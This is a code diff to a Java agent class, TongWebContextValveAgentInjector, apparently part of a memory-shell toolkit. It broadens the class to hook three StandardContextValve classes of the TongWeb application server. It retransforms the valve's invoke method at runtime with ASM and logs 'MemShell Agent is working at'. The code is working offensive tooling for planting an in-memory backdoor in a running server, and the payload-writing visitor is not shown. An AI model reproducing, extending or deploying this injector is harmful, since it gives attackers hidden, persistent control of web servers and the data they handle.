@@ -14,8 +14,11 @@ import java.util.zip.GZIPInputStream;
  * @since 2025/3/26
  */
 public class TongWebContextValveAgentInjector implements ClassFileTransformer {
-    private static final String TARGET_CLASS = "com/tongweb/web/thor/core/StandardContextValve";
-    private static final String TARGET_CLASS_1 = "com/tongweb/catalina/core/StandardContextValve";
+    private static final String[] TARGET_CLASSES = new String[]{
+            "com/tongweb/web/thor/core/StandardContextValve",
+            "com/tongweb/catalina/core/StandardContextValve",
+            "com/tongweb/server/core/StandardContextValve"
+    };
     private static final String TARGET_METHOD_NAME = "invoke";
 
     public static String getClassName() {
@@ -39,10 +42,11 @@ public class TongWebContextValveAgentInjector implements ClassFileTransformer {
         inst.addTransformer(new TongWebContextValveAgentInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
-            if (TARGET_CLASS.replace("/", ".").equals(name)
-                    || TARGET_CLASS_1.replace("/", ".").equals(name)) {
-                inst.retransformClasses(allLoadedClass);
-                System.out.println("MemShell Agent is working at " + name + ".invoke");
+            for (String targetClass : TARGET_CLASSES) {
+                if (targetClass.replace("/", ".").equals(name)) {
+                    inst.retransformClasses(allLoadedClass);
+                    System.out.println("MemShell Agent is working at " + name + ".invoke");
+                }
             }
         }
     }
@@ -51,21 +55,23 @@ public class TongWebContextValveAgentInjector implements ClassFileTransformer {
     @SuppressWarnings("all")
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
-        if (TARGET_CLASS.equals(className) || TARGET_CLASS_1.equals(className)) {
-            defineTargetClass(loader);
-            try {
-                ClassReader cr = new ClassReader(bytes);
-                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
-                    @Override
-                    protected ClassLoader getClassLoader() {
-                        return loader;
-                    }
-                };
-                ClassVisitor cv = getClassVisitor(cw);
-                cr.accept(cv, ClassReader.EXPAND_FRAMES);
-                return cw.toByteArray();
-            } catch (Exception e) {
-                e.printStackTrace();
+        for (String targetClass : TARGET_CLASSES) {
+            if (className.equals(targetClass)) {
+                defineTargetClass(loader);
+                try {
+                    ClassReader cr = new ClassReader(bytes);
+                    ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+                        @Override
+                        protected ClassLoader getClassLoader() {
+                            return loader;
+                        }
+                    };
+                    ClassVisitor cv = getClassVisitor(cw);
+                    cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                    return cw.toByteArray();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         }
         return bytes;
